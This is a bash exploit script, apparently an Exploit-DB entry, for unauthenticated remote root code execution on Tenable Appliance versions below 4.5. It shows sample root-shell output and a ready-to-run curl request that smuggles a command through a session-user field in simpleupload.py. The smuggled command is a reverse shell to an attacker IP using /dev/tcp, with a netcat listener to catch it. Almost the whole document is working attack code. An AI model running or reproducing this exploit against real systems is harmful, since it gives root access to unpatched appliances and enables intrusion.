#!/bin/bash
: '
According to http://static.tenable.com/prod_docs/upgrade_appliance.html they
fixed two security vulnerabilities in the web interface in release 4.5 so I
guess previous version are also vulnerable.

# Exploit Title: Unauthenticated remote root code execution on Tenable Appliance
# Date: 18/04/17
# Exploit Author: agix
# Vendor Homepage: https://www.tenable.com/
# Version: < 4.5
# Tested on: Tenable Appliance 3.5

tenable $ ./rce.sh
bash: no job control in this shell
bash-3.2# ls
app
appliancelicense.html
appliancelicense.pdf
appliancelicense.txt
images
includes
index.ara
js
lcelicense.html
lcelicense.pdf
lcelicense.txt
migrate
nessuslicense.html
nessuslicense.pdf
nessuslicense.txt
password.ara
pvslicense.html
pvslicense.pdf
pvslicense.txt
sclicense.html
sclicense.pdf
sclicense.txt
simpleupload.py
static
bash-3.2# id
uid=0(root) gid=0(root)
bash-3.2#
'

#!/bin/bash

TENABLE_IP="172.16.171.179"
YOUR_IP="172.16.171.1"
LISTEN_PORT=31337


curl -k "https://$TENABLE_IP:8000/simpleupload.py" --data $'returnpage=/&action=a&tns_appliance_session_token=61:62&tns_appliance_session_user=a"\'%0abash -i >%26 /dev/tcp/'$YOUR_IP'/'$LISTEN_PORT' 0>%261%0aecho '&
nc -l -p $LISTEN_PORT
